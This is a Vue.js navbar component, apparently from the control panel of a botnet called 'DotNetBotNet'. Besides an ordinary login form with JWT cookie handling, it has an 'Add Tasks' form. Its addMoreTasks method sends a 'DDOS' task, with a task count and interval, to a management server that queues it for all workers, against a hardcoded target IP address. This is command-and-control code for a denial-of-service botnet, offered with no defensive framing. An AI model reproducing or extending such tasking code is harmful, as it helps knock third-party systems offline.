<template>
  <nav class="navbar navbar-expand-lg navbar-absolute sticky-top " style="border-bottom:2px solid white;"
       :class="{'bg-black': !showMenu, 'navbar-transparent': showMenu}">
    <div class="container-fluid">
      <div class="container-fluid" >
        <div class="navbar-wrapper">
          <a class="navbar-brand" style="width: 50%; margin: auto 41% ; font-size: 36px; font-weight:bold;" href="">DotNetBotNet</a>
          <div class="" style="display: inline-flex; width: 25%;">
            <base-button v-if="isLoggedIn === false" block type="default" class=" mb-3" @click="showLogin = true" style="width: 48%;
                                      padding-left:5%;padding-right:5%;margin-right: 1%;text-align:center;color:white;">
              Sign In
            </base-button>
            <modal :show.sync="showLogin"
                   body-classes="p-0"
                   modal-classes="modal-dialog-centered modal-sm">
              <card type="secondary"
                    header-classes="bg-white pb-5"
                    body-classes="px-lg-5 py-lg-5"
                    class="border-0 mb-0">
                <template>
                  <div class="text-center mb-4" style="color:white;">
                    <blockquote>Sign in to use .NETBotNet</blockquote>
                  </div>
                  <form role="form" @submit.prevent="login">
                    <base-input alternative
                                class="mb-3"
                                v-model="username"
                                placeholder="Email"
                                addon-left-icon="ni ni-email-83">
                    </base-input>
                    <base-input alternative
                                type="password"
                                v-model="password"
                                placeholder="Password"
                                addon-left-icon="ni ni-lock-circle-open">
                    </base-input>
                    <base-checkbox @click="remember = true">
                      Remember me
                    </base-checkbox>
                    <div class="text-center">
                      <base-button type="primary" class="my-4" @click="login">Sign In</base-button>
                      <blockquote v-if="loginFailure === true" >Incorrect username or password, try again</blockquote>
                    </div>
                  </form>
                </template>
              </card>
            </modal>
            <base-dropdown v-if="isLoggedIn === true"
                           block type="default"
                           title-classes="btn btn-info"
                           style="width: 48%;
                                  padding-left:5%;
                                  padding-right:5%;
                                  margin-right: 10%;
                                  text-align:center;"
                                  :title="getUsernameForButton()">
              <base-button class="dropdown-item" style="background: red; color: white; width: 90%;" @click="logout">Sign Out</base-button>
            </base-dropdown>

            <base-button :disabled = "isDisabled" block type="default" class=" mb-3" @click="showAddMoreTasks = true" style="width: 48%;
                                      padding-left:5%;padding-right:5%;margin-left: 1%;text-align:center;color:white;background:rgb(66,183,130);">
              Add Tasks
            </base-button>
            <modal  :show.sync="showAddMoreTasks"
                    body-classes="p-0"
                    modal-classes="modal-dialog-centered modal-sm">
              <card type="secondary"
                    header-classes="bg-white pb-5"
                    body-classes="px-lg-5 py-lg-5"
                    class="border-0 mb-0">
                <template>
                  <div class="text-center mb-4" style="color:white;">
                    <blockquote>Add tasks to all workers:</blockquote>
                  </div>
                  <form role="form">
                    <base-input alternative
                                v-model="numTasks"
                                label="Number of Tasks:"
                                type="number"
                                class="mb-3">
                    </base-input>
                    <base-input alternative
                                v-model="interval"
                                label="Time Interval (Seconds between tasks):"
                                type="number">
                    </base-input>
                    <div class="text-center">
                      <base-button type="primary" class="badge-pill btn-info" @click="addMoreTasks">Submit Tasks</base-button>
                    </div>
                  </form>
                </template>
              </card>
            </modal>
          </div>
          <div class="col-form-label-sm">

          </div>
        </div>
      </div>
      <collapse-transition>
        <div class="collapse navbar-collapse show" v-show="showMenu">
          <ul class="navbar-nav" :class="$rtl.isRTL ? 'mr-auto' : 'ml-auto'">
            <div class="search-bar input-group" @click="searchModalVisible = true">

            </div>
          </ul>
        </div>
      </collapse-transition>
    </div>
  </nav>
</template>
<script>
  import { CollapseTransition } from 'vue2-transitions';
  import Modal from '@/components/Modal'
  import axios from "axios";
  import WorkerAdapter from "@/pages/store/adapter/WorkerAdapter";
  import IpConstants from "@/pages/store/IpConstants";
  import Cookies from 'js-cookie';
  import {getJwtTokenFromCookie, getUserNameFromCookie} from "@/pages/store/adapter/cookieUtils";

  export default {
    components: {
      CollapseTransition,
      Modal
    },
    computed: {
      routeName() {
        const { name } = this.$route;
        return this.capitalizeFirstLetter(name);
      },
      isRTL() {
        return this.$rtl.isRTL;
      }
    },
    data() {
      return {
        activeNotifications: false,
        showMenu: false,
        searchModalVisible: false,
        searchQuery: '',

        isLoggedIn: false,
        showLogin: false,
        enableTasksButton: false,
        remember: false,
        showAddMoreTasks: false,
        username: '',
        password: '',
        isDisabled: true,
        loginFailure: false,
        numTasks: 100,
        interval: 15
      };
    },
    methods: {
      capitalizeFirstLetter(string) {
        return string.charAt(0).toUpperCase() + string.slice(1);
      },
      toggleNotificationDropDown() {
        this.activeNotifications = !this.activeNotifications;
      },
      closeDropDown() {
        this.activeNotifications = false;
      },
      toggleSidebar() {
        this.$sidebar.displaySidebar(!this.$sidebar.showSidebar);
      },
      hideSidebar() {
        this.$sidebar.displaySidebar(false);
      },
      toggleMenu() {
        this.showMenu = !this.showMenu;
      },
      addMoreTasks() {
        this.showAddMoreTasks = false;
        let count = this.numTasks;
        let interval = this.interval;
        axios.post(`http://${IpConstants}:8080/Management/QueueTask`, {
          Task: "DDOS",
          Count: count,
          TaskParameters: {
            Interval: interval,
            Address: "73.175.139.33"
          }
        })
          .then((res) => {
            this.worker = new WorkerAdapter(res.data.bot);
            // state.commit(StoreMutations.SET_ALL_COMPLETED_TASKS, res.data);
          })
          .catch((error) => {
            // eslint-disable-next-line
            console.error(error);
          });
        this.numTasks = 100;
        this.interval = 15;
      },
      login() {
        axios.post(`http://${IpConstants}:8080/Management/Login`, { Username: this.username, Password: this.password}, null)
          .then(resp => {
            console.log(resp)
            // Successful login
            console.log("Login successful");
            this.loginFailure = false; // takes away error message
            this.showLogin = false; // hides login modal
            this.isDisabled = false; // enables the add tasks button
            this.isLoggedIn = true;

            // if remember me was checked
            if (this.remember === true) {
              console.log("we need to do something with this");
            }
            // Assuming resp.data contains the JWT and this.username contains the username
            const jwtToken = resp.data;
            const username = this.username;
            // Convert the object to a JSON string
            const jsonString = JSON.stringify({ jwtToken, username });

            // Set the cookie with the JWT and username
            Cookies.set('user', jsonString, { expires: 1 });
          })
          .catch(() => {
            // Invalid credentials
            console.log("Invalid username or password");
            this.loginFailure = true;
          })
      },
      getUsernameForButton() {
        return "Hello, " + getUserNameFromCookie() + "!";
      },
      logout() {
        this.username = '';
        this.password = '';
        this.isDisabled = true;
        Cookies.remove('user');
        this.isDisabled = false;
        this.isLoggedIn = false;
      },
      loggedIn() {
        const jwtToken = getJwtTokenFromCookie()
        if (jwtToken !== undefined && jwtToken !== false)
          this.isLoggedIn = true;
        return jwtToken !== undefined && jwtToken !== false
      },
    },
    mounted() {
      this.loggedIn();
    }
  };
</script>
